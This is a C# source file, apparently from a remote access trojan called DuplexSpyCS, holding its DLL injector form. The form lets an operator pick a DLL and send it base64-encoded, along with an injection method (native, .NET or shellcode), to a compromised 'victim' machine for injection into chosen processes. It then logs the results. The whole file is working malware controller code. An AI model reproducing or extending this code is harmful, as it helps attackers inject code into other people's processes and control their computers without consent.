using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace DuplexSpyCS
{
    public partial class frmTaskDLLInjector : Form
    {
        private clsVictim m_victim { get; set; }
        private List<(string, int)> m_lsProc { get; set; }

        public frmTaskDLLInjector(clsVictim victim, List<(string, int)> lsProc)
        {
            InitializeComponent();

            m_victim = victim;
            m_lsProc = lsProc;

            Text = @$"DLL Injector\\{victim.ID}";
        }

        public enum enMethod
        {
            Native,
            DotNet,
            ShellCode,
        }

        void fnRecv(clsListener listener, clsVictim victim, List<string> lsMsg)
        {
            if (!clsTools.fnbVictimEquals(victim, m_victim))
                return;

            if (lsMsg[0] == "inject")
            {
                if (lsMsg[1] == "dll")
                {
                    int nProc = int.Parse(lsMsg[2]);
                    int nCode = int.Parse(lsMsg[3]);
                    Invoke(new Action(() =>
                    {
                        richTextBox1.AppendText($"[{DateTime.Now.ToString("F")}] {nProc} => {clsCrypto.b64D2Str(lsMsg[4])}");
                        richTextBox1.AppendText(Environment.NewLine);
                    }));
                }
            }
        }

        private void fnSetup()
        {
            comboBox1.SelectedIndex = 2;

            foreach (var p in m_lsProc)
            {
                ListViewItem item = new ListViewItem(p.Item1);
                item.SubItems.Add(p.Item2.ToString());

                listView1.Items.Add(item);
            }

            m_victim.m_listener.ReceivedDecoded += fnRecv;

            toolStripStatusLabel1.Text = $"Process[{listView1.Items.Count}]";
        }

        private void frmTaskDLLInjector_Load(object sender, EventArgs e)
        {
            fnSetup();
        }

        private void button1_Click(object sender, EventArgs e)
        {
            OpenFileDialog ofd = new OpenFileDialog();
            ofd.Filter = "DLL File (*.dll)|*.dll";
            ofd.Multiselect = false;
            if (ofd.ShowDialog() == DialogResult.OK)
            {
                textBox1.Text = ofd.FileName;
            }
        }

        private void button2_Click(object sender, EventArgs e)
        {
            tabControl1.SelectedIndex = 1;

            try
            {
                string szFileName = textBox1.Text;
                if (!File.Exists(szFileName))
                    throw new Exception("Cannot find DLL file: " + szFileName);

                int nMethod = comboBox1.SelectedIndex;

                Task.Run(() =>
                {
                    byte[] abData = File.ReadAllBytes(szFileName);
                    foreach (var proc in m_lsProc)
                    {
                        m_victim.fnSendCommand(new string[]
                        {
                            "inject",
                            "dll",
                            proc.Item2.ToString(),
                            nMethod.ToString(),
                            szFileName,
                            Convert.ToBase64String(abData),
                        });
                    }
                });
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message, ex.GetType().Name, MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private void frmTaskDLLInjector_FormClosed(object sender, FormClosedEventArgs e)
        {
            m_victim.m_listener.ReceivedDecoded -= fnRecv;
        }

        private void toolStripMenuItem1_Click(object sender, EventArgs e)
        {
            new frmBoxHelper("Function\\TaskMgrInjector").Show();
        }
    }
}
